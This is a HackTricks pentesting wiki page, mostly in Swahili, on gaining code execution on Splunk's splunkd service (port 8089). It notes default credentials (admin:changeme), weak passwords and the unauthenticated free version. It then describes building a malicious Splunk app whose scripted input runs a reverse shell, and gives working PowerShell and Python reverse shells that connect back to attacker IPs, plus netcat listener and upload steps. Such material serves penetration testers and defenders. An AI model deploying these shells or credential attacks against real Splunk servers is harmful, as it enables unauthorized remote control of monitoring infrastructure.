# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basic Information**

* Zana ya uchambuzi wa log inayotumika kwa ukusanyaji wa data, uchambuzi, na uonyeshaji
* Inatumika sana katika ufuatiliaji wa usalama na uchambuzi wa biashara
* Bandari za default:
* Web server: 8000
* Huduma ya Splunkd: 8089

### Vulnerability Vectors:

1. Ukatili wa Toleo la Bure

* Toleo la majaribio linabadilishwa kiotomatiki kuwa toleo la bure baada ya siku 60
* Toleo la bure halina uthibitisho
* Hatari ya usalama ikiwa halitashughulikiwa
* Wasimamizi wanaweza kupuuzilia mbali athari za usalama

2. Udhaifu wa Akreditivu

* Toleo za zamani: Akreditivu za default `admin:changeme`
* Toleo za kisasa: Akreditivu zinawekwa wakati wa usakinishaji
* Uwezekano wa matumizi ya nywila dhaifu (mfano, `admin`, `Welcome`, `Password123`)

3. Fursa za Utekelezaji wa Msimbo wa Kijijini

* Njia nyingi za utekelezaji wa msimbo:
* Programu za Django upande wa seva
* Ncha za REST
* Ingizo la skripti
* Skripti za arifa
* Msaada wa majukwaa tofauti (Windows/Linux)
* Ingizo la skripti linaweza kukimbia:
* Skripti za Bash
* Skripti za PowerShell
* Skripti za Batch

Uwezekano wa Ukatili Muhimu:

* Hifadhi ya data nyeti
* Ukosefu wa uthibitisho katika toleo la bure
* Njia nyingi za uwezekano wa utekelezaji wa msimbo wa kijijini
* Uwezekano wa kutumia ingizo la skripti kwa ajili ya kuathiri mfumo

### Shodan

* `Splunk build`

## RCE

### Unda Programu Maalum

Splunk inatoa njia ya kisasa ya utekelezaji wa msimbo wa kijijini kupitia usambazaji wa programu maalum, ikitumia uwezo wake wa skripti za majukwaa tofauti. Mbinu ya msingi ya ukatili inahusisha kuunda programu mbaya inayoweza kutekeleza shell za kinyume kwenye mifumo ya Windows na Linux.

Programu maalum inaweza kukimbia **Python, Batch, Bash, au PowerShell scripts**. Zaidi ya hayo, **Splunk inakuja na Python iliyosakinishwa**, hivyo hata katika mifumo ya **Windows** utaweza kukimbia msimbo wa python.

Unaweza kutumia [**hii**](https://github.com/0xjpuff/reverse_shell_splunk) mfano na **`bin`** inayojumuisha mfano wa [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) na [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Au unaweza kuunda yako mwenyewe.

Mchakato wa ukatili unafuata mbinu thabiti katika majukwaa:
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
Faili muhimu la usanidi `inputs.conf` linawezesha skripti kwa:

* Kuweka `disabled = 0`
* Kuunda kipindi cha utekelezaji cha sekunde 10
* Kuelezea aina ya chanzo cha skripti

Kuweka ni rahisi:

1. Tengeneza kifurushi cha programu chenye madhara
2. Weka msikilizaji (Netcat/socat) kwenye mashine ya kushambulia
3. Pakia programu kupitia kiolesura cha Splunk
4. Washa utekelezaji wa skripti kiotomatiki baada ya kupakia

Mfano wa Windows PowerShell reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Mfano wa shell ya nyuma ya Python ya Linux:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

Katika ukurasa ufuatao unaweza kupata maelezo jinsi huduma hii inaweza kutumika vibaya kuongeza mamlaka na kupata kudumu:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
